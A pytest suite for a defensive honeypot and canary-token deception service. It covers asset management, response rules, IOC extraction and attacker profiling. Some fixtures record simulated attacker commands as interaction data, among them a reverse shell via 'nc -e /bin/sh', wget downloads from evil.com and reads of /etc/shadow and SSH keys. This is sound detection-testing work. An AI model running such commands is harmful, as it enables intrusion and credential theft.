"""
Tests for Dynamic Honeypot & Canary Deployment Service.
Full coverage of DynamicDeceptionService (in-memory fallback mode).
"""

import pytest
from services.msp.dynamic_deception import DynamicDeceptionService


class TestDynamicDeceptionService:
    """Test suite for the Dynamic Deception Engine."""

    def _svc(self) -> DynamicDeceptionService:
        return DynamicDeceptionService(db=None)

    # ==================== Asset CRUD ====================

    def test_prebuilt_assets_seeded(self):
        svc = self._svc()
        assets = svc.list_assets()
        assert len(assets) == 10, f"Expected 10 pre-built assets, got {len(assets)}"

    def test_create_asset(self):
        svc = self._svc()
        result = svc.create_asset(
            asset_type="honeypot",
            name="Test Honeypot",
            description="A test honeypot",
            config={"service": "ssh", "port": 22},
        )
        assert result["asset_id"].startswith("DA-")
        assert result["asset_type"] == "honeypot"
        assert result["name"] == "Test Honeypot"
        assert result["status"] == "staged"

    def test_get_asset(self):
        svc = self._svc()
        created = svc.create_asset(asset_type="canary_token", name="Test Token")
        fetched = svc.get_asset(created["asset_id"])
        assert fetched is not None
        assert fetched["asset_id"] == created["asset_id"]

    def test_get_asset_not_found(self):
        svc = self._svc()
        assert svc.get_asset("NONEXISTENT") is None

    def test_list_assets_filter_by_type(self):
        svc = self._svc()
        honeypots = svc.list_assets(asset_type="honeypot")
        assert all(a["asset_type"] == "honeypot" for a in honeypots)
        assert len(honeypots) >= 5  # 5 pre-built honeypots

    def test_list_assets_filter_by_status(self):
        svc = self._svc()
        staged = svc.list_assets(status="staged")
        assert all(a["status"] == "staged" for a in staged)

    def test_update_asset(self):
        svc = self._svc()
        created = svc.create_asset(asset_type="honeypot", name="Original")
        updated = svc.update_asset(created["asset_id"], {"name": "Updated", "description": "Changed"})
        assert updated["name"] == "Updated"
        assert updated["description"] == "Changed"

    def test_update_asset_not_found(self):
        svc = self._svc()
        assert svc.update_asset("NONEXISTENT", {"name": "x"}) is None

    def test_retire_asset(self):
        svc = self._svc()
        created = svc.create_asset(asset_type="honeypot", name="To Retire")
        retired = svc.retire_asset(created["asset_id"])
        assert retired["status"] == "retired"

    # ==================== Deployment ====================

    def test_deploy_asset(self):
        svc = self._svc()
        created = svc.create_asset(asset_type="honeypot", name="Deploy Me")
        deployed = svc.deploy_asset(created["asset_id"], target="192.168.1.100")
        assert deployed["status"] == "deployed"
        assert deployed["deployed_at"] is not None
        assert deployed["deployment_target"] == "192.168.1.100"

    def test_deploy_asset_not_found(self):
        svc = self._svc()
        assert svc.deploy_asset("NONEXISTENT") is None

    def test_undeploy_asset(self):
        svc = self._svc()
        created = svc.create_asset(asset_type="honeypot", name="Undeploy Me")
        svc.deploy_asset(created["asset_id"])
        undeployed = svc.undeploy_asset(created["asset_id"])
        assert undeployed["status"] == "staged"

    # ==================== Honeypot Services ====================

    def test_create_honeypot_service(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="HP Parent")
        hp = svc.create_honeypot_service(
            asset_id=asset["asset_id"],
            service_type="ssh",
            listen_port=2222,
            banner="SSH-2.0-OpenSSH_8.9",
            credentials=[{"username": "root", "password": "toor"}],
            capture_level="full_interaction",
        )
        assert hp["honeypot_id"].startswith("HP-")
        assert hp["service_type"] == "ssh"
        assert hp["listen_port"] == 2222

    def test_list_honeypot_services(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="HP List Test")
        svc.create_honeypot_service(asset_id=asset["asset_id"], service_type="ssh", listen_port=2222)
        svc.create_honeypot_service(asset_id=asset["asset_id"], service_type="rdp", listen_port=3389)
        all_hp = svc.list_honeypot_services()
        assert len(all_hp) == 2
        filtered = svc.list_honeypot_services(asset_id=asset["asset_id"])
        assert len(filtered) == 2

    # ==================== Canary Tokens ====================

    def test_create_canary_token(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="canary_token", name="Token Parent")
        token = svc.create_canary_token(
            asset_id=asset["asset_id"],
            token_type="aws_key",
            deployment_location=".env",
        )
        assert token["token_id"].startswith("CT-")
        assert token["token_type"] == "aws_key"
        assert token["token_value"].startswith("AKIA")

    def test_create_canary_token_api_key(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="canary_token", name="API Token")
        token = svc.create_canary_token(asset_id=asset["asset_id"], token_type="api_key")
        assert token["token_value"].startswith("sk-aither-")

    def test_check_token_found(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="canary_token", name="Check Token")
        token = svc.create_canary_token(asset_id=asset["asset_id"], token_type="dns")
        result = svc.check_token(token["token_value"])
        assert result is not None
        assert result["triggered"] is True
        assert result["token_id"] == token["token_id"]

    def test_check_token_not_found(self):
        svc = self._svc()
        assert svc.check_token("nonexistent-value") is None

    def test_record_token_trigger(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="canary_token", name="Trigger Token")
        token = svc.create_canary_token(asset_id=asset["asset_id"], token_type="api_key")
        triggered = svc.record_token_trigger(token["token_id"], source_ip="10.0.0.5", source_user="attacker")
        assert triggered["triggered_count"] == 1
        assert len(triggered["triggered_by"]) == 1
        assert triggered["triggered_by"][0]["source_ip"] == "10.0.0.5"

    def test_record_token_trigger_not_found(self):
        svc = self._svc()
        assert svc.record_token_trigger("NONEXISTENT", source_ip="1.2.3.4") is None

    def test_record_token_trigger_multiple(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="canary_token", name="Multi Trigger")
        token = svc.create_canary_token(asset_id=asset["asset_id"], token_type="aws_key")
        svc.record_token_trigger(token["token_id"], source_ip="10.0.0.1")
        result = svc.record_token_trigger(token["token_id"], source_ip="10.0.0.2")
        assert result["triggered_count"] == 2

    # ==================== Rules ====================

    def test_create_rule(self):
        svc = self._svc()
        rule = svc.create_rule(
            name="Auto Deploy SSH Honeypot",
            action="deploy_honeypot",
            risk_threshold=8.0,
            description="Deploy SSH honeypot when score >= 8",
        )
        assert rule["rule_id"].startswith("DR-")
        assert rule["action"] == "deploy_honeypot"
        assert rule["risk_threshold"] == 8.0
        assert rule["is_enabled"] is True

    def test_update_rule(self):
        svc = self._svc()
        rule = svc.create_rule(name="Update Test", action="alert_soc")
        updated = svc.update_rule(rule["rule_id"], {"risk_threshold": 9.0, "description": "Updated"})
        assert updated["risk_threshold"] == 9.0
        assert updated["description"] == "Updated"

    def test_update_rule_not_found(self):
        svc = self._svc()
        assert svc.update_rule("NONEXISTENT", {"name": "x"}) is None

    def test_list_rules(self):
        svc = self._svc()
        svc.create_rule(name="Rule 1", action="alert_soc")
        svc.create_rule(name="Rule 2", action="deploy_honeypot")
        rules = svc.list_rules()
        assert len(rules) == 2

    def test_list_rules_enabled_only(self):
        svc = self._svc()
        r1 = svc.create_rule(name="Enabled Rule", action="alert_soc")
        r2 = svc.create_rule(name="Disabled Rule", action="deploy_honeypot")
        svc.toggle_rule(r2["rule_id"])
        enabled = svc.list_rules(enabled_only=True)
        assert len(enabled) == 1
        assert enabled[0]["rule_id"] == r1["rule_id"]

    def test_toggle_rule(self):
        svc = self._svc()
        rule = svc.create_rule(name="Toggle Test", action="alert_soc")
        assert rule["is_enabled"] is True
        toggled = svc.toggle_rule(rule["rule_id"])
        assert toggled["is_enabled"] is False
        toggled2 = svc.toggle_rule(rule["rule_id"])
        assert toggled2["is_enabled"] is True

    def test_toggle_rule_not_found(self):
        svc = self._svc()
        assert svc.toggle_rule("NONEXISTENT") is None

    # ==================== Threat Evaluation ====================

    def test_evaluate_threat_no_rules(self):
        svc = self._svc()
        result = svc.evaluate_threat_and_deploy("ip", "192.168.1.50", 9.5)
        assert result["entity_type"] == "ip"
        assert result["threat_score"] == 9.5
        assert result["actions_taken"] == []  # No rules configured

    def test_evaluate_threat_triggers_rule(self):
        svc = self._svc()
        svc.create_rule(name="High Threat", action="deploy_honeypot", risk_threshold=7.0, target_entity_type="ip")
        result = svc.evaluate_threat_and_deploy("ip", "10.0.0.99", 8.5)
        assert len(result["actions_taken"]) == 1
        action = result["actions_taken"][0]
        assert action["action"] == "deploy_honeypot"
        assert "deployed_asset_id" in action["result"]

    def test_evaluate_threat_below_threshold(self):
        svc = self._svc()
        svc.create_rule(name="High Only", action="alert_soc", risk_threshold=9.0)
        result = svc.evaluate_threat_and_deploy("ip", "10.0.0.1", 5.0)
        assert len(result["actions_taken"]) == 0

    def test_evaluate_threat_redirect_action(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Redirect Target")
        svc.deploy_asset(asset["asset_id"])
        svc.create_rule(
            name="Redirect Rule",
            action="redirect_to_honeypot",
            risk_threshold=6.0,
            deception_asset_id=asset["asset_id"],
        )
        result = svc.evaluate_threat_and_deploy("ip", "10.0.0.50", 8.0)
        assert len(result["actions_taken"]) == 1
        assert result["actions_taken"][0]["result"]["redirected_to"] == asset["asset_id"]

    def test_evaluate_threat_plant_canary_action(self):
        svc = self._svc()
        svc.create_rule(name="Plant Canary", action="plant_canary", risk_threshold=5.0)
        result = svc.evaluate_threat_and_deploy("ip", "172.16.0.1", 7.0)
        assert len(result["actions_taken"]) == 1
        assert result["actions_taken"][0]["result"]["breadcrumbs_planted"] == 4

    def test_evaluate_threat_alert_soc_action(self):
        svc = self._svc()
        svc.create_rule(name="SOC Alert", action="alert_soc", risk_threshold=8.0)
        result = svc.evaluate_threat_and_deploy("ip", "203.0.113.1", 9.5)
        assert len(result["actions_taken"]) == 1
        assert result["actions_taken"][0]["result"]["alert_sent"] is True
        assert result["actions_taken"][0]["result"]["severity"] == "critical"

    def test_evaluate_threat_entity_type_mismatch(self):
        svc = self._svc()
        svc.create_rule(name="IP Only", action="alert_soc", risk_threshold=5.0, target_entity_type="ip")
        result = svc.evaluate_threat_and_deploy("user", "attacker@evil.com", 9.0)
        assert len(result["actions_taken"]) == 0

    # ==================== Interaction Recording ====================

    def test_record_interaction(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Interaction Test")
        svc.deploy_asset(asset["asset_id"])
        interaction = svc.record_interaction(
            asset_id=asset["asset_id"],
            source_ip="10.0.0.5",
            data={
                "interaction_type": "auth_attempt",
                "credentials_used": "root:password123",
                "commands_executed": ["whoami", "cat /etc/passwd"],
            },
        )
        assert interaction["log_id"].startswith("IL-")
        assert interaction["source_ip"] == "10.0.0.5"
        assert interaction["interaction_type"] == "auth_attempt"
        # Asset should be marked active
        updated = svc.get_asset(asset["asset_id"])
        assert updated["status"] == "active"
        assert updated["interaction_count"] == 1

    def test_record_interaction_intelligence_value(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Intel Test")
        # High-value interaction
        interaction = svc.record_interaction(
            asset_id=asset["asset_id"],
            source_ip="10.0.0.5",
            data={
                "interaction_type": "command",
                "credentials_used": "admin:pass",
                "commands_executed": ["whoami", "cat /etc/shadow", "wget http://evil.com/shell.sh", "chmod +x shell.sh", "nc -e /bin/sh 10.0.0.99 4444"],
                "files_accessed": ["/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa"],
                "duration_seconds": 600,
            },
        )
        assert interaction["intelligence_value"] in ("high", "critical")

    # ==================== Intelligence ====================

    def test_generate_intelligence_report(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Report Test")
        # Record some interactions
        svc.record_interaction(asset["asset_id"], "10.0.0.1", {
            "interaction_type": "auth_attempt",
            "credentials_used": "admin:admin",
            "service": "ssh",
        })
        svc.record_interaction(asset["asset_id"], "10.0.0.1", {
            "interaction_type": "command",
            "commands_executed": ["whoami", "uname -a", "cat /etc/passwd"],
        })
        svc.record_interaction(asset["asset_id"], "10.0.0.2", {
            "interaction_type": "reconnaissance",
        })
        report = svc.generate_intelligence_report(asset["asset_id"])
        assert report["report_id"].startswith("IR-")
        assert report["findings"]["total_interactions"] == 3
        assert report["findings"]["unique_source_ips"] == 2
        assert len(report["iocs_extracted"]) > 0
        assert len(report["ttps_observed"]) > 0
        assert report["attacker_profile"]["interaction_count"] == 3

    def test_generate_intelligence_report_no_interactions(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Empty Report")
        result = svc.generate_intelligence_report(asset["asset_id"])
        assert result.get("error") == "no_interactions_found"

    def test_extract_iocs(self):
        svc = self._svc()
        interactions = [
            {"source_ip": "10.0.0.1", "credentials_used": "root:pass", "commands_executed": ["wget http://evil.com/shell"], "files_accessed": ["/etc/shadow"], "raw_data": {"user_agent": "Mozilla/5.0"}},
            {"source_ip": "10.0.0.2", "credentials_used": "", "commands_executed": ["powershell -enc abc"], "files_accessed": [], "raw_data": {}},
        ]
        iocs = svc._extract_iocs(interactions)
        assert any("ip:10.0.0.1" in ioc for ioc in iocs)
        assert any("ip:10.0.0.2" in ioc for ioc in iocs)
        assert any("command:" in ioc for ioc in iocs)
        assert any("powershell_command:" in ioc for ioc in iocs)

    def test_analyze_ttps(self):
        svc = self._svc()
        interactions = [
            {"interaction_type": "auth_attempt", "raw_data": {"service": "ssh"}, "commands_executed": []},
            {"interaction_type": "command", "raw_data": {}, "commands_executed": ["net share", "reg query HKLM"]},
            {"interaction_type": "reconnaissance", "raw_data": {}, "commands_executed": []},
            {"interaction_type": "command", "raw_data": {"sql_injection": True}, "commands_executed": []},
        ]
        ttps = svc._analyze_ttps(interactions)
        assert "T1110" in ttps or "T1110.001" in ttps  # Brute force
        assert "T1046" in ttps  # Network discovery
        assert "T1135" in ttps  # Share discovery
        assert "T1012" in ttps  # Registry query
        assert "T1190" in ttps  # SQLi

    def test_profile_attacker(self):
        svc = self._svc()
        interactions = [
            {"source_ip": "10.0.0.1", "source_user": "root", "credentials_used": "root:pass1", "interaction_type": "auth_attempt", "commands_executed": [], "duration_seconds": 5},
            {"source_ip": "10.0.0.1", "source_user": "admin", "credentials_used": "admin:pass2", "interaction_type": "auth_attempt", "commands_executed": [], "duration_seconds": 3},
            {"source_ip": "10.0.0.1", "source_user": "", "credentials_used": "", "interaction_type": "command", "commands_executed": ["whoami"], "duration_seconds": 60},
        ]
        profile = svc._profile_attacker(interactions)
        assert "10.0.0.1" in profile["source_ips"]
        assert profile["credentials_attempted"] == 2
        assert profile["interaction_count"] == 3
        assert profile["sophistication"] == "basic"

    def test_profile_attacker_advanced(self):
        svc = self._svc()
        cmds = [f"cmd_{i}" for i in range(25)]
        interactions = [
            {"source_ip": "10.0.0.1", "source_user": "", "credentials_used": "", "interaction_type": "command", "commands_executed": cmds, "duration_seconds": 3600},
            {"source_ip": "10.0.0.1", "source_user": "", "credentials_used": "", "interaction_type": "data_upload", "commands_executed": [], "duration_seconds": 120},
        ]
        profile = svc._profile_attacker(interactions)
        assert profile["sophistication"] == "advanced"
        assert profile["likely_intent"] == "data_theft"

    # ==================== Analytics ====================

    def test_get_most_triggered_assets(self):
        svc = self._svc()
        asset1 = svc.create_asset(asset_type="honeypot", name="Triggered 1")
        asset2 = svc.create_asset(asset_type="honeypot", name="Triggered 2")
        # Record interactions to bump counts
        for _ in range(5):
            svc.record_interaction(asset1["asset_id"], "10.0.0.1", {"interaction_type": "connection"})
        for _ in range(3):
            svc.record_interaction(asset2["asset_id"], "10.0.0.2", {"interaction_type": "connection"})
        most = svc.get_most_triggered_assets(limit=5)
        assert len(most) >= 2
        assert most[0]["interaction_count"] >= most[1]["interaction_count"]

    def test_get_attacker_origins(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Origins Test")
        svc.record_interaction(asset["asset_id"], "10.0.0.1", {"interaction_type": "connection"})
        svc.record_interaction(asset["asset_id"], "10.0.0.1", {"interaction_type": "connection"})
        svc.record_interaction(asset["asset_id"], "10.0.0.2", {"interaction_type": "connection"})
        origins = svc.get_attacker_origins()
        assert origins.get("10.0.0.1", 0) == 2
        assert origins.get("10.0.0.2", 0) == 1

    def test_get_credential_attempts(self):
        svc = self._svc()
        asset = svc.create_asset(asset_type="honeypot", name="Cred Test")
        svc.record_interaction(asset["asset_id"], "10.0.0.1", {
            "interaction_type": "auth_attempt",
            "credentials_used": "admin:password",
        })
        svc.record_interaction(asset["asset_id"], "10.0.0.1", {
            "interaction_type": "connection",
        })
        creds = svc.get_credential_attempts()
        assert len(creds) == 1
        assert creds[0]["interaction_type"] == "auth_attempt"

    def test_get_deception_coverage(self):
        svc = self._svc()
        coverage = svc.get_deception_coverage(client_id="test-client")
        assert coverage["client_id"] == "test-client"
        assert coverage["total_assets"] == 10  # Pre-built
        assert "honeypots_deployed" in coverage
        assert "coverage_score" in coverage

    def test_get_dashboard(self):
        svc = self._svc()
        dashboard = svc.get_dashboard()
        assert "summary" in dashboard
        assert "coverage" in dashboard
        assert "most_triggered_assets" in dashboard
        assert "attacker_origins" in dashboard
        assert "asset_status_breakdown" in dashboard
        assert "asset_type_breakdown" in dashboard
        assert dashboard["summary"]["total_assets"] == 10

    # ==================== Breadcrumbs ====================

    def test_plant_breadcrumbs(self):
        svc = self._svc()
        result = svc._plant_breadcrumbs("192.168.1.0/24")
        assert result["breadcrumbs_planted"] == 4
        assert len(result["token_ids"]) == 4
        assert result["target"] == "192.168.1.0/24"

    # ==================== Edge Cases ====================

    def test_redirect_to_honeypot(self):
        svc = self._svc()
        svc._redirect_to_honeypot("10.0.0.99", "HP-ABC123")
        assert svc._redirects.get("10.0.0.99") == "HP-ABC123"

    def test_assess_intelligence_value_low(self):
        svc = self._svc()
        assert svc._assess_intelligence_value({"interaction_type": "connection"}) == "low"

    def test_assess_intelligence_value_medium(self):
        svc = self._svc()
        assert svc._assess_intelligence_value({"credentials_used": "admin:pass"}) == "medium"

    def test_assess_intelligence_value_high(self):
        svc = self._svc()
        result = svc._assess_intelligence_value({
            "interaction_type": "command",
            "credentials_used": "root:toor",
            "commands_executed": ["whoami", "id"],
            "files_accessed": ["/etc/shadow"],
        })
        assert result in ("high", "critical")

    def test_assess_intelligence_value_critical(self):
        svc = self._svc()
        result = svc._assess_intelligence_value({
            "interaction_type": "command",
            "credentials_used": "root:toor",
            "commands_executed": ["whoami", "id", "cat /etc/shadow", "wget http://evil.com/payload"],
            "files_accessed": ["/etc/shadow", "/root/.ssh/id_rsa", "/var/lib/mysql"],
            "duration_seconds": 600,
        })
        assert result == "critical"

    def test_calc_time_span_single(self):
        svc = self._svc()
        assert svc._calc_time_span([{"timestamp": "2026-01-01T00:00:00"}]) == "single_event"

    def test_calc_time_span_minutes(self):
        svc = self._svc()
        result = svc._calc_time_span([
            {"timestamp": "2026-01-01T00:00:00"},
            {"timestamp": "2026-01-01T00:30:00"},
        ])
        assert "minutes" in result

    def test_calc_time_span_hours(self):
        svc = self._svc()
        result = svc._calc_time_span([
            {"timestamp": "2026-01-01T00:00:00"},
            {"timestamp": "2026-01-01T05:00:00"},
        ])
        assert "hours" in result

    def test_generate_token_value_types(self):
        svc = self._svc()
        assert svc._generate_token_value("aws_key").startswith("AKIA")
        assert svc._generate_token_value("api_key").startswith("sk-aither-")
        assert svc._generate_token_value("database_cred").startswith("postgres://")
        assert "internal.aither.local" in svc._generate_token_value("dns")
        assert "https://" in svc._generate_token_value("url")
        assert "@canary.aither.local" in svc._generate_token_value("email")
        assert "HKLM" in svc._generate_token_value("registry_key")
        assert "AITHER_SECRET_" in svc._generate_token_value("env_variable")
        assert svc._generate_token_value("unknown").startswith("canary-")

    def test_multiple_rules_multiple_actions(self):
        svc = self._svc()
        svc.create_rule(name="Rule A", action="alert_soc", risk_threshold=6.0)
        svc.create_rule(name="Rule B", action="deploy_honeypot", risk_threshold=7.0)
        result = svc.evaluate_threat_and_deploy("ip", "10.0.0.99", 9.0)
        assert len(result["actions_taken"]) == 2

    def test_redirect_with_no_honeypot_available(self):
        svc = DynamicDeceptionService.__new__(DynamicDeceptionService)
        svc.db = None
        svc._use_db = False
        svc._assets = {}
        svc._honeypots = {}
        svc._tokens = {}
        svc._rules = {}
        svc._interactions = {}
        svc._reports = {}
        svc._token_index = {}
        svc._redirects = {}
        svc._initialized = True
        svc.create_rule(name="Redirect No HP", action="redirect_to_honeypot", risk_threshold=5.0)
        result = svc.evaluate_threat_and_deploy("ip", "10.0.0.1", 8.0)
        assert len(result["actions_taken"]) == 1
        assert result["actions_taken"][0]["result"].get("error") == "no_honeypot_available"
